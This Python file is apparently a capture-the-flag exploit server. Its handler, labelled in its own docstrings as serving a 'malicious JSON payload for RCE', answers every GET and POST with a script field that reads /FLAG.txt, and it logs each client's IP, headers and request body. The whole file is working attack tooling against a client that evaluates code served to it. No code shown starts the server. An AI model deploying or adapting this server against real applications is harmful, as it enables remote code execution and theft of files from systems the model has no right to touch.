from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import signal
import sys

# Global flag for graceful shutdown
running = True

def signal_handler(sig, frame):
    global running
    running = False
    print("\n[SHUTDOWN] Received shutdown signal")

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

class RCEHandler(BaseHTTPRequestHandler):
    """Serves malicious JSON payload for RCE"""
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass
    
    def do_GET(self):
        """Serve malicious JSON on GET request"""
        client_ip = self.client_address[0]
        print(f"\n[+] GET {self.path} from {client_ip}")
        
        # Log headers
        for header, value in self.headers.items():
            print(f"    {header}: {value}")
        
        # Malicious payload
        payload = {"script": "open('/FLAG.txt').read()"}
        json_data = json.dumps(payload).encode('utf-8')
        
        # Send response
        try:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', len(json_data))
            self.send_header('Connection', 'close')
            self.end_headers()
            self.wfile.write(json_data)
            print(f"[+] Sent: {payload}")
        except BrokenPipeError:
            print(f"[-] Client disconnected early")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def do_POST(self):
        """Serve malicious JSON on POST request"""
        client_ip = self.client_address[0]
        content_length = int(self.headers.get('Content-Length', 0))
        
        print(f"\n[+] POST {self.path} from {client_ip}")
        
        if content_length > 0:
            body = self.rfile.read(content_length)
            print(f"    Body: {body.decode('utf-8', errors='ignore')}")
        
        # Malicious payload
        payload = {"script": "open('/FLAG.txt').read()"}
        json_data = json.dumps(payload).encode('utf-8')
        
        # Send response
        try:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Length', len(json_data))
            self.send_header('Connection', 'close')
            self.end_headers()
            self.wfile.write(json_data)
            print(f"[+] Sent: {payload}")
        except BrokenPipeError:
            print(f"[-] Client disconnected early")
        except Exception as e:
            print(f"[-] Error: {e}")

